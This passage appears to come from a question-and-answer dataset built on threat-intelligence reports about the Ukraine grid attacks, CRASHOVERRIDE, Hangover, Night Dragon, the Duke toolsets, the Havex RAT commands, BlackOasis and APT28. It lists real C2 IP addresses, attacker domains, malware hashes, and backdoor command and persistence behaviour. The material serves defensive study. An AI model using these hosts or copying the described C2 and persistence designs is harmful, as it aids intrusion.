    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Ukraine Cyber Attack 2015\nThe cyber-attack on three power companies in Ukraine on December 23rd, 2015 marked a revolutionary event for electric grid operators. It was the first known instance where a cyber-attack had disrupted electric grid operations. The Sandworm team was attributed to the attack and their use of the BLACKENERGY 3 malware. BLACKENERGY 3 does not contain ICS components in the way that BLACKENERGY 2 did. Instead, the adversaries leveraged the BLACKENERGY 3 malware to gain access to the corporate networks of the power companies and then pivot into the SCADA networks. While in the environment the adversaries performed their reconnaissance and eventually leveraged the grids systems against itself. They learned the operations and used the legitimate functionality of distribution management systems to disconnect substations from the grid leaving 225,000+ customers without power for upwards of 6 hours until manual operations could restore power. However, due to the wiping of Windows systems through the KillDisk malware and destruction of serial-to-Ethernet devices through malicious firmware updates, the Ukrainian grid operators were without their SCADA environment, meaning they lost the ability for automated control, for upwards of a year in some locations. The most notable aspect of the attack was the adversary's focus on learning how to leverage the systems against themselves. Malware enabled the attack, and malware delayed restoration efforts, but it was the direct interaction of the adversary leveraging the ICS against itself that resulted in the electric power disruptions, not malware.\nMedium Headline: CRASHOVERRIDE\nThe CRASHOVERRIDE malware impacted a single transmission level substation in Ukraine on December 17th, 2016. Many elements of the attack appear to have been more of a proof of concept than what was fully capable in the malware. The most important thing to understand though from the evolution of tradecraft is the codification and scalability in the malware towards what has been learned through past attacks. The malware took an approach to understand and codify the knowledge of the industrial process to disrupt operations as STUXNET did. It leveraged the OPC protocol to help it map the environment and select its targets similar to HAVEX. It targeted the libraries and configuration files of HMIs to understand the environment further and leveraged HMIs to connect to Internet-connected locations when possible as BLACKENERGY 2 had done. And it took the same type of approach to understanding grid operations and leveraging the systems against themselves displayed in Ukraine 2015's attack. It did all of these things with added sophistication in each category giving the adversaries a platform to conduct attacks against grid operations systems in various environments and not confined to work only on specific vendor platforms. It marks an advancement in capability by adversaries who intend to disrupt operations and poses a challenge for defenders who look to patching systems as a primary defense, using anti-malware tools to spot specific samples, and relying upon a strong perimeter or air-gapped network as a silver-bullet solution. Adversaries are getting smarter, they are growing in their ability to learn industrial processes and codify and scale that knowledge, and defenders must also adapt.\nMedium Headline: Capabilities Overview\nThe CRASHOVERRIDE malware is a modular framework consisting of an initial backdoor, a loader module, and several supporting and payload modules.\nThe most important items are the backdoor, which provides access to the infected system, the loader module, which enables effects on the target, and the individual payload modules. Dragos focused our analysis on the previously mentioned items as they are most relevant for defending grid operations.\nDragos analysts were able to obtain two samples of the malware related to effects on the targeted industrial control system. One sample was the IEC 104 protocol module, and the other sample was the data wiper. Both samples shared common design characteristics indicative of being part of a broader ICS attack and manipulation framework. ESET was able to uncover an additional IEC 61850 and OPC module which they have analyzed and shared with Dragos.\nBelow contains an overview of program execution flow and dependency.\nMedium Headline: Module Commonalities\nDragos analysts were able to determine the compile time for both modules obtained as being within 12 minutes of each other just after 2:30 am on December 18th in an unknown time zone although timestamps for both samples were zeroed out. These times falls in the same timeframe as the Ukraine events. Both module samples exported a function named Crash that served as the main function to begin execution. The common Crash function enables the ability to \"plug and play\" additional modules.\nMedium Headline: Backdoor/RAT Module\nKey Features\n\u2022 Authenticates with a local proxy via the internal network established before the backdoor installation\n\u2022 After authentication opens HTTP channel to external command and control server (C2) through internal proxy\n\u2022 Receives commands via the external command and control (C2) server\n\u2022 Creates a file on the local system (contents not determined)\n\u2022 Overwrites an existing service to point to the backdoor so the malware persists between reboots\nDetails\nAccess to the ICS network flows through a backdoor module. Dragos obtained four samples which all featured similar functionality. On execution, the malware attempts to contact a hard-coded proxy address located within the local network. ELECTRUM must establish the internal proxy before the installation of the back-door.\nThe malware expects to communicate to an internal proxy listening on TCP 3128. This port is a default port associated with the Squid proxy. The beaconing continues without pause until it establishes a connection. The backdoor then sends a series of HTTP POST requests with the victim's Windows GUID (a unique identifier set with every Windows installation) in the HTTP body. This information authenticates the targeted machine to the command and control (C2) server. If the C2 server does not respond, the backdoor will exit.\nIf the authentication is successful to the internal proxy, the malware attempts to perform an HTTP CONNECT to an external C2 server via the internal proxy. Across four samples, Dragos identified three different C2 addresses which were likely part of the December 2016 attack on Ukraine:\n195.16.88.6\n5.39.218.152\nA check of the TOR project's ExoneraTOR service indicates that all of the listed IP addresses were listed as active TOR nodes during the events in Ukraine.\nWhen performing the HTTP CONNECT, the malware attempts to identify the system default user agent. If this cannot be determined or does not exist, then a hard-coded default for the malware is used:\nThe malware can be configured to beacon out periodically afterwards via a hard-coded configuration value. The implant is designed to retrieve commands from the C2 server:\n\u2022 Create a new process as logged in user\n\u2022 Create a new process as specified user via CreateProcessWithLogon\n\u2022 Write a file\n\u2022 Copy a file\n\u2022 Execute a command as logged in user\n\u2022 Execute a command as specified user\n\u2022 Kill the backdoor\n\u2022 Stop a service\n\u2022 Specify a user (log in as user) and stop a service\n\u2022 Specify a user (log in as user) and start a service\n\u2022 Alter an existing service to point to specified process and change to start at boot\nExecution results in several artifacts left on the host. During execution, the malware checks for the presence of a mutex value. Mutexes are program objects that name resources to enable sharing with multiple program threads. In this case, CRASHOVERRIDE checks the following:\n\\Sessions\\1\\Windows\\ApiPortection\nThe backdoor may also create and check a blank mutex name. Reviewing memory during execution and analysis of other modules in the malware indicates that \\ Sessions\\1\\Windows\\ appears multiple times, indicating that a check may be performed.\nThe backdoor writes a file to either C:\\Users\\Public\\ or C:\\Users\\<Executing User>\nThe contents of this file were not discovered during our analysis, and it did not appear to be vital to the malware functionality. However, this is a good indicator of the observed activity and may be leveraged to detect this specific sample through host-based indicator checking.\nThe service manipulation process is the only persistence mechanism for the malware. When used, the adversary can select an arbitrary system service, direct it to refer to CRASHOVERRIDE, and ensure it is loaded on system boot. If this fails, the malware, although present on disk, will not start when the machine reboots.\nWhen evaluating the options provided to the adversary, an important piece of functionality associated with most remote access tools is absent: a command to exfiltrate data. While this functionality could be created via the command execution options, one would expect this option to be explicit given options to download and copy files on the host if the adversary intended to use the tool as an all-encompassing backdoor and espionage framework. Instead, the functionality of this tool is explicitly designed for facilitating access to the machine and executing commands on the system and cannot reasonably be confused as an espionage platform, data stealer, or another such item.\nRead the text above and answer this question: How did the Sandworm team leverage the BLACKENERGY 3 malware in the 2015 Ukraine cyber-attack, and what were the key consequences of this attack?",
    "output": "The Sandworm team used the BLACKENERGY 3 malware to gain access to the corporate networks of the power companies and then pivoted into the SCADA networks. They performed reconnaissance and leveraged the legitimate functionality of distribution management systems to disconnect substations from the grid, leaving over 225,000 customers without power for up to six hours. The attack also involved the wiping of Windows systems through the KillDisk malware and the destruction of serial-to-Ethernet devices through malicious firmware updates, resulting in the loss of automated control for upwards of a year in some locations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Target selection\nWe have direct knowledge of only one attack \u2013 the one against Telenor. During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups. We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them; enough to identify targets down to IP and machine name/domain level. This showed a geographical distribution where Pakistan was the most affected in volume, but also showed a multitude of other countries being represented.\nNote that these data should be taken as indicative only. IP counts are misleading for many reasons. One machine can generate many IP addresses, and some IP addresses are probably lab machines. However, the indication that Pakistan is the most prevalent target seems solid.\nIn the following pages we've highlighted some of the files we have seen used to attack organizations in different countries. As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible.\nMedium Headline: Pakistan\nThe most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the most active in connecting to malicious domains.\nWe found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012 log entry (subdomain redacted):\nSinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy: \"GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan.....\"\nDecoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture and religious matters.\nPakistani soldiers praying in Karakoram. Apparent source: http://photography.nationalgeographic.com/photography/enlarge/praying-soldiers_pod_image.html\nGoogle images of the Mendhar region in India. There was a border clash there recently.\nA review of Indian future weapon acquisitions.It seems to be sourced from defence.pk\nAdditional examples can be found in Appendix B.\nMedium Headline: China\nChina is another country which apparently has been targeted to some extent.\nFor example, we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution. This dump was generated in July 2012 and contains Word documents, PowerPoint presentations and images.\nUploaded archives of harvested data.\nDecoys are also present, but not in the amount as is seen against Pakistani targets.\nChinese decoy, a scanned document named court_order.jpg. This is a notification to the family of a criminal about his jail sentence. Language is simplified Chinese; likely mainland China.\nMedium Headline: The Khalistan movement\nThis is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India. Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement's creation in 1971.\nExamples of malware apparently aimed at the movement are md5's a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa. The former appears to be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip\nIt is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure \u2013 for example the domain researcherzone.net which was used in the Telenor intrusion. There are also a number of domains with active web pages that used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on to another bad IP (46.182.104.83) and must be considered owned by the attackers.\nMedium Headline: The Nagaland movement\nThe Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at least two attacks apparently aimed at them.\nA sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which appears to be a letter from the \"President of Nagalim\".\nThe malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124. Zeusagency.org has hosted different malware; one (3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126.\nThe IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares. These are somewhat different from the standard Hanove series, though functionality is roughly equivalent.\nAnother malicious installer (md5 f1799d11b34685aa209171b0a4b89d06) contained the following decoy:\nThe malware included connects to the domain global-blog.net.\n\nBased on the above text, answer a question. What evidence suggests that China was targeted by the APT, and how did the attackers tailor their approach for Chinese targets compared to Pakistani ones?",
    "output": "Evidence of China being targeted includes the discovery of a data dump and keylog harvested from a computer belonging to a Chinese academic institution. This dump, generated in July 2012, contained Word documents, PowerPoint presentations, and images. The attackers also used decoys, although not as extensively as with Pakistani targets. An example of a Chinese decoy is a scanned document named 'court_order.jpg,' which was a notification to the family of a criminal about his jail sentence, written in simplified Chinese, indicating mainland China as the target. The difference in approach suggests that while Pakistan was the primary target with a high volume of tailored decoys, the attackers also had an interest in Chinese targets but employed fewer resources in crafting specific decoys for them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attachment 1 - Night Dragon Specific Protection Measures for Consideration\nThe exploits and methods contained in Night Dragon's attack set are not new or unique to our industry, nor are the approaches or methods to combat it.  However NERC issues this Advisory in response to an identified pattern of activity that has been directed against the energy sector. This Advisory communicates specific information and suggested actions for Night Dragon in accordance with standard detection, prevention, and recovery phases of a strong incident response program.\nThe following framework provides two sets of prioritized measures and countermeasures that may be useful to prevent traffic to and from known \"command and control\" (C&C) servers and domains, and identify the presence of Night Dragon activity on specific systems. They begin with simple low-cost, low-impact, high-value prevention and detection suggestions, and escalate to more invasive actions should evidence of Night Dragon activity or compromise be found.\nThese actions are based on information available as of February 18, 2011, and while they offer good suggestions to detect and combat Night Dragon, they provide no guarantee that a targeted attack against your systems would be unsuccessful. If you have not already done so, take this opportunity to establish a reporting relationship with ICS CERT and NERC's ES-ISAC for real-time sharing of any new information on this attack set such as additional C&C servers, updated search strings, new variants, etc.\nEntities should also closely monitor their relevant security vendors for signature updates and detection and removal tools.  Some of these measures are invasive and could create problems with operational systems.  It is important to understand your technology environment and the impact these tools could have on operational systems prior to any deployment.\n\nIn the context of the Night Dragon APT, how does the advisory suggest entities should approach the implementation of protection measures to ensure minimal disruption to operational systems?",
    "output": "A: The advisory suggests that entities should first implement simple, low-cost, low-impact, high-value prevention and detection measures. These initial steps are designed to minimize disruption to operational systems while still providing significant security benefits. The measures then escalate to more invasive actions if evidence of Night Dragon activity or compromise is found. Entities are advised to thoroughly understand their technology environment and assess the potential impact of these tools on their operational systems before deploying them. This approach ensures that security enhancements are made without causing unnecessary disruptions to critical operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the CosmicDuke toolset establish persistence and what techniques does it share with other Duke toolsets?",
    "output": "The CosmicDuke toolset establishes persistence through various components that the toolset operators may selectively include with the main component. These components provide multiple methods of establishing persistence and attempt to exploit privilege escalation vulnerabilities to execute CosmicDuke with higher privileges. The techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. Many of CosmicDuke's persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. In all of these cases, the techniques are the same, but the code itself has been altered to work with the toolset in question, leading to small differences in the final implementation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nShould answers be available, their numbers would be printed as a debug message and processed and the following would be displayed as a debug message:\nANSWER\n1 (meaning one answer)\nConnecting post: HTTP:\\\\C&C server with botID as parameter\n8 (size of answer * 2 as it is converted to unicode)\nreqstream\nwrote to stream\nThis essentially does a POST request to the C&C server using the BOTID and the following User Agent: \"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0\" On the C&C server side, a new file would be created named after the BOTID with the extension \".ans\".\nHere is an example of such a file:\nThe date of the post can be found, the base64 encoded C&C server and the unicode string Answer, modified in this example.\nThis is how the attackers get an answer (result) from a given task.\n5.3 Network communication - WorkReceive\nThe WorkReceive function essentially does a GET request on the C&C server in order to receive a task to complete on the infected computer. The task to execute is encrypted and base64 encoded\nand returned between the \"havex\" tags. Here is an example without any task between the tags:\nThe trojan calls the DataParser to locate the task:\nThe task is decrypted, decoded and stored in the \"KeyWork\\\\[name_from_version_information]\\\\ work\" subkey.\n5.4 WorkBegin - Task Dispatcher\nJust before the WorkBegin method is called, the \"begin work\" debug message is displayed. The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser.\nAfterwards, two things are extracted: The command to execute and the data parameter for the command.\n5.5 The Commands\nThe final step calls the command dispatcher, which executes the command sent by the attackers.\n5.5.1 SCR\nThe \"SCR\" command is used by the attacker to request a Screen Capture of the infected computer. Typical GDI functions are used, including: CreateCompatibleDC, GetSystemMetrics and CreateCompatibleBitmap.\nThe screenshots are made as JPG files. If a screenshot already exist, it is deleted prior the creation of a new one.\n5.5.2 DIR / DIS\nThe \"DIR\" and \"DIS\" commands are used to generate Directory listings using the XML format.\n5.5.3 TIM\nThe TIM command is responsible for updating the Timeout parameter in the registry. The command finds where the KeyWork is located and updates the Time out with the parameter provided to the command.\n5.5.4 UPD\nThe UPD command is used to run an updated version of the RAT. The currently running RAT executes the update and exits. Upon execution, the newly updated version will delete the old RAT using the Cleaner method described earlier.\n5.5.5 FID\nChange Folder attributes.\n5.5.6 LIB\nThe LIB command is used to load a DLL on the infected machine. It simply uses LoadLibrary.\n5.5.7 FIR\nThe FIR command is used to run an executable on the infected computer. The process is created with hidden windows to stay unnoticed.\n5.5.8 UPS\nThe UPS command is used to update the C&C server in the registry.\n5.5.9 FIS\nThe FIS command is used to check if the file passed as parameter exists on the infected computer.\n5.5.10 FIT\nThe FIT command is used to delete a file passed as parameter to the command if it exists on the infected computer.\n5.5.11 CMD\nThe CMD command is used to execute a command on the infected machine using cmd.exe\n5.5.12 KEY\nThe KEY command is used to update the Priv and Pub key in the registry.\n5.6 Sleep and Loop again\nOnce the commands have been executed, the debug message \"End work\" is displayed. The malware then sleeps for a random amount of time and the main loop continues. If the commands were executed, all results stored in the registry will be POSTED to the server via the AnsSend method.\nThe malware loops forever waiting for new orders from the attackers.\n\nExplain the role and functionality of the various commands used by the Crouching Yeti malware, such as SCR, DIR/DIS, TIM, UPD, and others. How do these commands contribute to the overall operation of the malware, and what specific actions do they perform on the infected system?",
    "output": "The Crouching Yeti malware uses several commands to control the infected system. The 'SCR' command captures the screen using GDI functions and saves it as a JPG file. The 'DIR' and 'DIS' commands generate directory listings in XML format. The 'TIM' command updates the Timeout parameter in the registry. The 'UPD' command runs an updated version of the RAT and deletes the old version. The 'FID' command changes folder attributes. The 'LIB' command loads a DLL using LoadLibrary. The 'FIR' command runs an executable with hidden windows. The 'UPS' command updates the C&C server address in the registry. The 'FIS' command checks if a file exists. The 'FIT' command deletes a specified file. The 'CMD' command executes a command using cmd.exe. The 'KEY' command updates the private and public keys in the registry. These commands allow the attackers to remotely control the infected system, gather information, and maintain persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Introduction\nKaspersky Lab has always worked closely with vendors to protect users. As soon as we find new vulnerabilities we immediately inform the vendor in a responsible manner and provide all the details required for a fix.\nOn October 10, 2017, Kaspersky Lab's advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers. The exploit was delivered through a Microsoft Office document and the final payload was the latest version of FinSpy malware. We have reported the bug to Adobe who assigned it (<https://helpx.adobe.com/security/products/flash-player/apsb17-32.html>)CVE-2017-11292 and released a patch earlier today:\nSo far only one attack has been observed in our customer base, leading us to believe the number of attacks are minimal and highly targeted.\nAnalysis of the payload allowed us to confidently link this attack to an actor we track as \"BlackOasis\". We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by (<https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html>)FireEye in September 2017. The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye.\n\nHow did Kaspersky Lab identify the involvement of the 'BlackOasis' APT group in the exploitation of the Adobe Flash zero-day vulnerability (CVE-2017-11292), and what specific indicators led them to link this attack to another zero-day exploit (CVE-2017-8759) discovered by FireEye?",
    "output": "Kaspersky Lab identified the involvement of the 'BlackOasis' APT group in the exploitation of the Adobe Flash zero-day vulnerability (CVE-2017-11292) through analysis of the payload used in the attack. The payload was found to be the latest version of FinSpy malware. This analysis allowed Kaspersky to confidently attribute the attack to 'BlackOasis'. Additionally, the FinSpy payload used in the current attacks shared the same command and control (C2) server as the payload used with CVE-2017-8759, which was previously uncovered by FireEye. This commonality in the C2 infrastructure provided strong evidence linking both zero-day exploits to the 'BlackOasis' group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: APT28 Targeting a Journalist Covering the Caucasus\nAnother one of APT28's lures appeared to target a specific journalist covering issues in the Caucasus region. In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a \"Chief Coordinator\" in Reason Magazine's \"Caucasian Issues Department\" - a division that does not appear to exist.6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine. In the background, the decoy document installed a SOURFACE backdoor on the victim's system.\n5 \"The EU's Association Agreements with Georgia, the Republic of Moldova and Ukraine\". European Union Press Release Database. 23 June 2014.  Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm\n6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s).\nTable 1: Examples of APT28 domains imitating organizations in the Caucasus\nThe body of the letter suggests that APT28 actors are able to read at least two languages \u2013 Russian and English.  The grammar of the letter also indicates that English is not the author's first language, despite it purportedly originating from a US-based magazine. This implies that Russian may be the APT28 author's preferred language.\nTargeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. Several other nation states are suspected of targeting journalists and dissidents to monitor their activity, including China and Iran.7,8 Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow. Journalists critical of the Kremlin have long been targets of surveillance and harassment, and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media.9\nSmall Headline: APT28's Other Targets in the Caucasus\nWe have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus, as shown in the table below. One APT28 domain imitated a key Chechen-focused news website, while the other appeared to target members of the Armenian military by hosting a fake login page.\nOf particular note, the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists. In 200410  and 2013,11  Russia's Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website.\n7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. \"Operation Saffron Rose\". FireEye. 13 May 2014. Web. http://www.fireeye.com/blog/technical/ malware-research/2014/05/operation-saffron-rose.html\n8 The New York Times publicly disclosed their breach by APT12, which they assess was motivated by the China-based actors' need to know what the newspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party's leadership.\n9 \"Russia\". Freedom House Press Release. 2013. Web. http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew\n10\"Chechen website promotes terror: Lavrov\". UPI. 16 November 2014. Web. http://www.upi.com/Top_News/2004/11/16/Chechen-website-promotes-terror-Lavrov/UPI-11601100627922/\n11\"Lavrov urges Sweden to ban Chechen website server\" The Voice of Russia. 15 May 2013. Web. http://voiceofrussia.com/news/2013_05_15/Lavrov-urges-Sweden-to-ban-Chechen-website-server/\nBig Headline: EASTERN EUROPEAN GOVERNMENTS AND MILITARIES\nEastern European countries' political and military postures are traditionally core Russian government interests. The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic, political, and military interest. Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region. Many of APT28's targets parallel this continued focus on Eastern European governments and militaries.\nMedium Headline: APT28 Targets Eastern European Government Organizations\nWe have evidence that APT28 made at least two attempts to compromise Eastern European government organizations:\n\u2022 In a late 2013 incident, a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client's network.\n\u2022 More recently, in August 2014 APT28 used a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government.  A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post.12 The Polish security company indicated that the sample was \"sent to the government,\" presumably the Polish government, given the company's location and visibility.\n12 \"MHT, MS12-27 Oraz *malware*.info\" Malware@Prevenity. 11 August 2014. Web. http://malware.prevenity.com/2014/08/malware-info.html\nTable 2:  Examples of APT28 domains imitating legitimate Eastern European organization names\nMedium Headline: We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations.\nAPT28 has registered domains similar to those of legitimate Eastern European news sites and governments, listed in Table 2.  These domain registrations not only suggest that APT28 is interested in Eastern European political affairs, but also that the group targets Eastern European governments directly.\nIn addition, APT28 used one domain for command and control sessions (baltichost[.]org) that was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise, hosted annually since 2009 by one of the three Baltic States (Estonia, Latvia, and Lithuania, all three of which are on Russia's border) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event, and focused on exercises to improve interoperability with regional allies and partners.13, 14\nThis domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters. Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships. These exercises are a particular point of interest in Moscow: pro-Kremlin press cited Russia's interpretation of these military exercises and NATO's involvement as a \"sign of aggression,\" and Russia's Foreign Minister publicly stated that the exercise was \"a demonstration of hostile intention.\"15\n13 \"Saber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia'. Estonian Defense Forces. 9 June 2014. Web. 11 June 2014. http://www.mil.ee/en/ news/8251/saber-strike-and-baltic-host-kick-off-in-latvia,-lithuania-and-estonia\n14 \"Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber-attacks\". Republic of Lithuania Ministry of National Defense. 12 June 2014. Web. http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_ support_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber-attacks.html\n15 \"Tanks, troops, jets: NATO countries launch full-scale war games in Baltic\". Russia Today. 9 June 2014. Web. http://rt.com/news/164772-saber-strike-exercise-nato/\n\nHow did APT28 utilize domain registrations to target Eastern European governments and military exercises? What specific domain was used and what was its significance?",
    "output": "APT28 registered domains similar to those of legitimate Eastern European news sites and governments, suggesting a keen interest in Eastern European political affairs and direct targeting of these governments. One notable example is the domain baltichost[.]org, which was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise hosted annually by one of the three Baltic States (Estonia, Latvia, and Lithuania) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event. This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters, potentially providing APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Malware infections\nBecause almost all of the computers at Microsoft run real-time security software at all times, most infection attempts are detected and blocked before they are able to infect the target computer. When Defender or SCEP do disinfect a computer, it is usually because the software's signature database has been updated to enable it to detect a threat that it did not recognize when the computer first encountered the threat. This lack of recognition may be because the threat is a new malware family, a new variant of a known family, a known variant that has been encrypted or otherwise repackaged to avoid detection, or because of some other reason. The MMPC constantly analyzes malware samples submitted to it, develops appropriate detection signatures, and deploys them to customers who use SCEP, Microsoft Security Essentials, and Windows Defender.\nFigure 92. Infections and removals at Microsoft in 1H15, by category\nAs this chart shows, detection and infection statistics were significantly different in 1H15. Adware, which accounted for more than 1.2 million detections at Microsoft in 1H15, was not discovered on a single computer internally during the period. Most of the other categories also show clear differences between (<>)Figure (<>)89 and (<>)Figure 92, although the ordering in the latter chart is significantly influenced by the low volumes involved.\nFigure 93. Infections and removals at Microsoft in 1H15, by file type\nMedium Headline: What IT departments can do to protect their users\n\uf0b7 Evaluate commercially available management tools, develop a plan, and implement a third-party update mechanism to disseminate non-Microsoft updates.\n\uf0b7 Ensure that all software deployed on computers in the environment is updated regularly. If the software provider offers an automatic update utility similar to Microsoft Update, ensure that it is enabled by default. See (<http://windows.microsoft.com/en-us/windows/turn-automatic-updating-on-off>)\"Turn (<http://windows.microsoft.com/en-us/windows/turn-automatic-updating-on-off>)automatic updating on or off\" at windows.microsoft.com for instructions on enabling automatic updates of Microsoft software.\n\uf0b7 Ensure that SmartScreen Filter is enabled in Internet Explorer. See (<http://windows.microsoft.com/en-US/internet-explorer/use-smartscreen-filter>)\"SmartScreen Filter: frequently asked questions\" at windows.microsoft.com for more information.\n\uf0b7 Use Group Policy to enforce configurations for Windows Update, Windows Firewall, and SmartScreen Filter. See Knowledge Base article (<http://support.microsoft.com/kb/328010>)KB328010 at support.microsoft.com, and (<https://technet.microsoft.com/library/jj717241.aspx>)\"Windows Firewall with Advanced Security (<https://technet.microsoft.com/library/jj717241.aspx>)Deployment Guide\" and (<http://technet.microsoft.com/library/jj618329.aspx>)\"Manage Privacy: SmartScreen Filter and Resulting (<http://technet.microsoft.com/library/jj618329.aspx>)Internet Communication\" at technet.microsoft.com for instructions.\n\uf0b7 Set the default configuration for antimalware to enable real-time protection across all drives, including removable devices.\n\uf0b7 Enable (<http://blogs.technet.com/b/mmpc/archive/2015/01/20/maps-in-the-cloud_3A00_-how-can-it-help-your-enterprise_3F00_.aspx>)Microsoft Active Protection Service (MAPS) advanced membership in Windows Defender and Microsoft Security Essentials in your organization to protect your enterprise software security infrastructure in the cloud.\nFigure 94. Enabling MAPS advanced membership in Windows Defender\n\uf0b7 Identify business dependencies on Java and develop a plan to minimize its use where it is not needed.\n\uf0b7 Use AppLocker to block the installation and use of unwanted software such as Java or peer-to-peer (P2P) applications. See (<http://technet.microsoft.com/library/ee619725(v=WS.10).aspx>)\"AppLocker: Frequently (<http://technet.microsoft.com/library/ee619725(v=WS.10).aspx>)Asked Questions\" at technet.microsoft.com for more information.\n\uf0b7 Implement the Enhanced Mitigation Experience Toolkit (EMET), if possible, to minimize exploitation of vulnerabilities in all software in your environment. See (<http://technet.microsoft.com/security/jj653751>)technet.microsoft.com/security/jj653751 for more information.\n\uf0b7 Implement strong password policies, and require employees to change their passwords periodically.\n\uf0b7 Strengthen authentication by using smart cards. See (<http://technet.microsoft.com/library/dd277362.aspx>)\"Smart Cards\" at technet.microsoft.com for more information.\nUse Network Access Protection (NAP) and DirectAccess (DA) to enforce compliance policies for firewall, antimalware, and patch management on remote systems that connect to a corporate network. See (<http://msdn.microsoft.com/library/windows/desktop/aa369712(v=vs.85).aspx>)\"Network Access Protection\" at msdn.microsoft.com and (<http://technet.microsoft.com/video/windows-7-directaccess-explained.aspx>)\"Windows 7 DirectAccess Explained\" at technet.microsoft.com for more information.\nAppendixes\nAppendix A: Threat naming conventions ..............................123\nAppendix B: Data sources ...........................................................125\nAppendix C: Worldwide encounter and infection rates....127\nGlossary.............................................................................................132\nThreat families referenced in this report................................ 141\nIndex ..................................................................................................148\nBig Headline: Appendix B: Data sources\nData included in the Microsoft Security Intelligence Report is gathered from a wide range of Microsoft products and services whose users have opted in to provide usage data. The scale and scope of this telemetry data allows the report to deliver the most comprehensive and detailed perspective on the threat landscape that is available in the software industry:\n\uf0b7 \uf0b7 \uf0b7 The (<http://www.microsoft.com/security/pc-security/malware-removal.aspx>)Malicious Software Removal Tool (MSRT) is a free tool that Microsoft designed to help identify and remove specific prevalent malware families from customer computers. The MSRT is primarily released as an important update through Windows Update, Microsoft Update, and Automatic 